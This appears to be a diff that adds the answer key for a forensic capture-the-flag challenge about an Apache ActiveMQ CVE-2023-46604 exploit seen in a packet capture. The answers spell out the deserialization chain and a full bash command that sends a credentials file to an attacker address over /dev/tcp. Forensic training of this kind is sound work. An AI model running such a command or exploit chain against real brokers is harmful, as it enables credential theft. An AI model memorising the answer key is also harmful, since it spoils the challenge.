@@ -1,0 +1,110 @@
+[
+  {
+    "num": 1,
+    "question": "What is the CVE identifier of the exploited vulnerability?",
+    "format": "CVE-YYYY-NNNNN",
+    "answer": "CVE-2023-46604"
+  },
+  {
+    "num": 2,
+    "question": "What is the CVSS v3.1 Base Score of that CVE?",
+    "format": "one decimal, e.g. 7.5",
+    "answer": "10.0"
+  },
+  {
+    "num": 3,
+    "question": "What is the vulnerable Apache product (full product name)?",
+    "format": "Apache <product>",
+    "answer": "Apache ActiveMQ"
+  },
+  {
+    "num": 4,
+    "question": "What is the name of the messaging protocol abused by the exploit frame?",
+    "format": "OneWord",
+    "answer": "OpenWire"
+  },
+  {
+    "num": 5,
+    "question": "What is the default TCP port of that protocol?",
+    "format": "integer",
+    "answer": "61616"
+  },
+  {
+    "num": 6,
+    "question": "What is the ActiveMQ broker version string present in the capture?",
+    "format": "X.Y.Z",
+    "answer": "5.15.9"
+  },
+  {
+    "num": 7,
+    "question": "What is the attacker's IPv4 address?",
+    "format": "a.b.c.d",
+    "answer": "10.133.7.37"
+  },
+  {
+    "num": 8,
+    "question": "What is the broker's (victim's) IPv4 address?",
+    "format": "a.b.c.d",
+    "answer": "10.133.7.50"
+  },
+  {
+    "num": 9,
+    "question": "What is the fully-qualified Java class name coerced during deserialization?",
+    "format": "a.b.c.ClassName",
+    "answer": "org.springframework.context.support.ClassPathXmlApplicationContext"
+  },
+  {
+    "num": 10,
+    "question": "What is the full HTTP URL argument given to that class's constructor?",
+    "format": "http://host:port/path",
+    "answer": "http://10.133.7.37:8000/poc.xml"
+  },
+  {
+    "num": 11,
+    "question": "What is the SHA-256 of the XML file fetched by the broker? (lowercase hex)",
+    "format": "64 hex chars",
+    "answer": "87ab1de5a0dc6d435402864e8c81ed1e3dbb82106dac6cc7cf8d4a67133bcead"
+  },
+  {
+    "num": 12,
+    "question": "What Java class is instantiated by the Spring bean inside that XML?",
+    "format": "a.b.c.ClassName",
+    "answer": "java.lang.ProcessBuilder"
+  },
+  {
+    "num": 13,
+    "question": "What is the shell binary chosen by the bean (first list element)?",
+    "format": "OneWord",
+    "answer": "bash"
+  },
+  {
+    "num": 14,
+    "question": "What is the full command string executed by the broker (third list element)?",
+    "format": "full command",
+    "answer": "cat /opt/activemq/conf/credentials.properties > /dev/tcp/10.133.7.37/4444"
+  },
+  {
+    "num": 15,
+    "question": "What TCP destination port received the exfiltrated bytes?",
+    "format": "integer",
+    "answer": "4444"
+  },
+  {
+    "num": 16,
+    "question": "What is the absolute path of the file the broker exfiltrated?",
+    "format": "/path/to/file",
+    "answer": "/opt/activemq/conf/credentials.properties"
+  },
+  {
+    "num": 17,
+    "question": "What is the SHA-256 of the exfiltrated payload bytes? (lowercase hex)",
+    "format": "64 hex chars",
+    "answer": "d2f896d8678ce2e994f848fba8bda496e40c327b45122e98a170beff2b73a7a5"
+  },
+  {
+    "num": 18,
+    "question": "What is the api.token value inside the exfiltrated file?",
+    "format": "api.token value",
+    "answer": "HG9-7f2b4c1e-9d8a-5f6b-3e2a-1c4d5f6a7b8c"
+  }
+]
